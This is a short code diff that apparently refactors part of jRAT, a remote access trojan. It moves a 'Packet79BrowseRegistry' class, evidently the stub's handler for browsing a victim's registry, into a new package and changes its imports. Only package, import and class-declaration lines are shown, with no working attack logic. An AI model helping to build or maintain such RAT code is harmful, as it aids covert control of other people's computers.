@@ -1,7 +1,7 @@
-package io.jrat.stub.packets.incoming;
+package jrat.module.registry;
 
 import io.jrat.stub.Connection;
-import io.jrat.stub.packets.outgoing.Packet54Registry;
+import io.jrat.stub.packets.incoming.AbstractIncomingPacket;
 
 public class Packet79BrowseRegistry extends AbstractIncomingPacket {
 
